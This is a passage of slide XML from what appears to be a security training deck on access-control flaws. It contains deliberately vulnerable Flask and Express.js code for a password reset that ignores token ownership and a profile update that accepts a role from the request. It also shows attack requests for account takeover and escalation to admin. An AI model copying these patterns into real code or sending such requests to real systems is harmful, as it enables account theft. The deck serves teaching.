                <a:ea typeface="Petrona Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>User ID Manipulation</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Text 17"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="788670" y="3515677"/>
            <a:ext cx="6485096" cy="506492"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1300"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>The critical exploit: Attacker submits password reset with their valid token but changes user_id to victim's ID (2500). The vulnerable code validates the token but never verifies it belongs to user_id 2500. Request: {"user_id": 2500, "reset_token": "abc123xyz789", "new_password": "hacked123"}</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="Text 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7356515" y="2958703"/>
            <a:ext cx="128111" cy="160139"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1300"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Petrona Light" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Light" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Light" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>04</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Shape 19"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7356515" y="3161228"/>
            <a:ext cx="6485215" cy="15240"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="007EBD"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="Text 20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7356515" y="3255764"/>
            <a:ext cx="2155627" cy="210264"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1650"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Petrona Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Account Takeover Complete</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="23" name="Text 21"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7356515" y="3515677"/>
            <a:ext cx="6485215" cy="506492"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1300"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>System returns success. Attacker now logs in as victim using the new password. POST /api/login with victim's email and "hacked123" grants full access to the victim's bank account, funds, and personal information.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="24" name="Text 22"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="788670" y="4242316"/>
            <a:ext cx="2360890" cy="252413"/>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Petrona Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Vulnerable Code Analysis</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1550" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="25" name="Shape 23"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="788670" y="4618792"/>
            <a:ext cx="13053060" cy="3062288"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1758"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="26" name="Shape 24"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="782360" y="4618792"/>
            <a:ext cx="13065681" cy="3062288"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 628"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="27" name="Text 25"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="910471" y="4714875"/>
            <a:ext cx="12809458" cy="2870121"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="13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@app.route('/api/reset-password', methods=['POST'])</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="13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def reset_password():</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="13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data = request.get_json()</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="13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user_id = data.get('user_id')</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="13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new_password = data.get('new_password')</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="13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reset_token = data.get('reset_token')</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="13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a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="13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 Validates token but doesn't check ownership</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="13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token = ResetToken.query.filter_by(token=reset_token).first()</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="13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if token and not token.expired:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="13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 CRITICAL BUG: No verification that user_id matches token's user</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="13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user = User.query.get(user_id)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="13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user.password = hash_password(new_password)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="13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db.session.commit()</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="13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return jsonify({'status': 'success'})</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="13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a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1300"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="F2F2F2"/>
                </a:highlight>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t> return jsonify({'status': 'invalid token'}), 400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837498"/>
            <a:ext cx="7556421" cy="1488519"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="5850"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="4650" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Petrona Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>5.3 Vertical Privilege Escalation</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="4650" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Text 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="793790" y="4666178"/>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Gaining </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1750" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>higher-level privileges</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1750" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t> than intended (e.g., regular user → administrator).</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45649" y="1662113"/>
            <a:ext cx="7524155"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Petrona Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Real Example - Parameter Tampering for Admin Access</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Text 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6145649" y="2056805"/>
            <a:ext cx="1620798"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Vulnerable Application:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Shape 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6145649" y="2327791"/>
            <a:ext cx="7825502" cy="2211348"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2154"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Shape 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6140053" y="2327791"/>
            <a:ext cx="7836694" cy="2211348"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 769"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6253401" y="2412802"/>
            <a:ext cx="7609999" cy="2041327"/>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Express.js - VULNERABLE CODE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app.post('/api/update-profile', (req, res) =&gt;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const userId = req.session.userId;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const { name, email, role } = req.body; // ← DANGEROUS!</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 Updates user including role from request body</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db.query(</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'UPDATE users SET name=?, email=?, role=? WHERE id=?',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[name, email, role, userId],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(err) =&gt;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if (err) return res.status(500).send('Error');</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res.send('Profile updated');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p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6145649" y="4659511"/>
            <a:ext cx="1488519"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Normal Request:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Shape 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6145649" y="4909185"/>
            <a:ext cx="3774400" cy="1394817"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3415"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Shape 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6140053" y="4909185"/>
            <a:ext cx="3785592" cy="1394817"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1220"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Text 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6253401" y="4994196"/>
            <a:ext cx="3558897" cy="1224796"/>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POST /api/update-profile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Content-Type: application/json</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Cookie: session=user_token</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1050"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pP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"name": "John Doe",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"email": "john@example.com",</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"role": "user"</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p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Shape 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10122694" y="4602837"/>
            <a:ext cx="3937754" cy="1764863"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4627"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="007EBD">
              <a:alpha val="95000"/>
            </a:srgbClr>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Text 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10236041" y="4659511"/>
            <a:ext cx="1488519" cy="185976"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1450"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Petrona Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Attack Request:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Shape 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10236041" y="4909185"/>
            <a:ext cx="3711059" cy="1394817"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3415"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0D8BCA"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Shape 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10230445" y="4909185"/>
            <a:ext cx="3722251" cy="1394817"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1220"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0D8BCA"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Text 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10343793" y="4994196"/>
            <a:ext cx="3495556" cy="1224796"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1050"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="850" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="0D8BCA"/>
                </a:highlight>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>POST /api/update-profile</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1050"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="850" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="0D8BCA"/>
                </a:highlight>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Content-Type: application/json</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1050"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="850" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="0D8BCA"/>
                </a:highlight>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Cookie: session=user_token</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1050"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1050"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="850" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="0D8BCA"/>
                </a:highlight>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>{</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1050"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="850" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="0D8BCA"/>
                </a:highlight>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>  "name": "John Doe",</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1050"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="850" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="0D8BCA"/>
                </a:highlight>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>  "email": "john@example.com",</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1050"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="850" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="0D8BCA"/>
                </a:highlight>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>  "role": "admin" ← ATTACKER ADDS THIS</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1050"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="850" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="0D8BCA"/>
                </a:highlight>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
